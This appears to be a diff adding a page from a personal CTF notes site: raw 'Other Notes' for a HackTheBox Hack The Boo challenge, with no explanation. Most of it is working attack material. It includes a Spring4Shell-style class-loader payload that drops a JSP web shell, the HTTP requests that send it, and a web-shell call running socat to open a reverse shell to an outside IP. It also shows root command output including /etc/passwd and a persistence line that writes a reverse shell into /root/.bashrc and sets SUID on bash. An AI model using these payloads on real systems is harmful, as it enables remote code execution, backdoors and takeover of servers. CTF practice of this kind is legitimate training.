@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Other Notes · the-grizzly-bear</title>
+<meta name="description" content="Other Notes — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/2022-hack-the-boo/other-notes.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">2022 Hack The Boo</a></div>
+<h1 id="title">Other Notes</h1>
+
+<p>GET /e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash HTTP/1.1</p>
+<p>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</p>
+<p>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</p>
+<p>GET /spookhouse/home/ HTTP/1.1<br>
+Host: 192.168.1.166:8080<br>
+User-Agent: python-requests/2.28.1<br>
+Accept-Encoding: gzip, deflate<br>
+Accept: <em>/</em><br>
+Connection: keep-alive<br>
+prefix: &lt;%<br>
+suffix: %&gt;//<br>
+c: Runtime</p>
+<p>POST /spookhouse/home/ HTTP/1.1</p>
+<p>Host: 192.168.1.166:8080</p>
+<p>User-Agent: python-requests/2.28.1</p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Accept: <em>/</em></p>
+<p>Connection: keep-alive</p>
+<p>Content-Type: application/x-www-form-urlencoded</p>
+<p>Content-Length: 73</p>
+<p>class.module.classLoader.resources.context.parent.pipeline.first.pattern=</p>
+<p>id<br>
+uid=0(root) gid=0(root) groups=0(root)<br>
+groups<br>
+root<br>
+uname -r<br>
+5.18.0-kali7-amd64<br>
+cat /etc/passwd<br>
+root:x:0:0:root:/root:/bin/bash<br>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
+bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
+sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
+sync:x:4:65534:sync:/bin:/bin/sync<br>
+games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin<br>
+find / -perm -u=s -type f 2&gt;/dev/null<br>
+/bin/su<br>
+/bin/umount<br>
+/bin/mount<br>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>
+/usr/lib/openssh/ssh-keysign<br>
+/usr/bin/newgrp<br>
+/usr/bin/chfn<br>
+/usr/bin/gpasswd<br>
+/usr/bin/passwd<br>
+/usr/bin/chsh<br>
+echo 'socat TCP:192.168.1.180:1337 EXEC:sh' &gt; /root/.bashrc &amp;&amp; echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev &gt; /dev/null &amp;&amp; chmod +s /bin/bash<br>
+ls -lha<br>
+total 20K<br>
+drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .<br>
+drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..<br>
+-rwxrwx--- 1 root root 1.8K Oct  8 00:04 pom.xml<br>
+drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src<br>
+drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target</p>
+<p>SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg==</p>
+<p class="figure"><a class="img-link" href="other-notes/untitled.png"><img src="other-notes/untitled.png" alt="Untitled" loading="lazy"></a></p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
